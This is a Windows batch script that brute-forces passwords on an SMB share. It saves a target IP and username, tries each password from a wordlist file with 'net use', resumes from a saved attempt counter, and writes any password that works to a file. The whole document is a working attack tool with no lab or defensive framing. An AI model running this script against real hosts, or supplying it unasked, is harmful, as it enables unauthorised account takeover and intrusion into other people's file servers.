@echo off
setlocal EnableDelayedExpansion

:: Check if credentials file exists and load it if it does
if exist "smb_creds.txt" (
    for /f "tokens=1,2 delims==" %%a in (smb_creds.txt) do (
        if "%%a"=="IP" set "saved_ip=%%b"
        if "%%a"=="USERNAME" set "saved_user=%%b"
    )
)

:: Get or confirm credentials
if defined saved_ip (
    set /p "confirm_creds=Use saved credentials (Y/N)? "
    if /i "!confirm_creds!"=="Y" (
        set "ip=!saved_ip!"
        set "user=!saved_user!"
    ) else (
        goto :get_creds
    )
) else (
    :get_creds
    set /p "ip=Enter IP Address: "
    set /p "user=Enter Username: "
    
    :: Save credentials
    echo IP=!ip!> smb_creds.txt
    echo USERNAME=!user!>> smb_creds.txt
)

:: Initialize counter file if it doesn't exist
if not exist "attempt_counter.txt" (
    echo 0 > attempt_counter.txt
)

:: Read current attempt count
set /p total_attempts=< attempt_counter.txt

echo Starting from attempt #%total_attempts%
echo Testing passwords for \\%ip% with username %user%
echo Starting at %time%
echo.

:: Clean any existing connections
net use \\%ip% /d /y >nul 2>&1

:: Test each password
for /f "usebackq delims=" %%a in ("current_chunk.txt") do (
    set "pass=%%a"
    call :attempt "!pass!"
    set /a total_attempts+=1
    echo !total_attempts! > attempt_counter.txt
)

echo.
echo Chunk completed at %time%
echo Total attempts: %total_attempts%
exit /b 0

:attempt
set "current_pass=%~1"
net use \\%ip% /user:%user% "%current_pass%" >nul 2>&1
if !errorlevel! equ 0 (
    echo.
    echo PASSWORD FOUND: %current_pass%
    echo Password found after %total_attempts% attempts
    echo Found at: %time%
    echo %current_pass% > password_found.txt
    net use \\%ip% /d /y >nul 2>&1
    exit 1
)
net use \\%ip% /d /y >nul 2>&1
echo Testing password #!total_attempts!: %current_pass%
exit /b 0
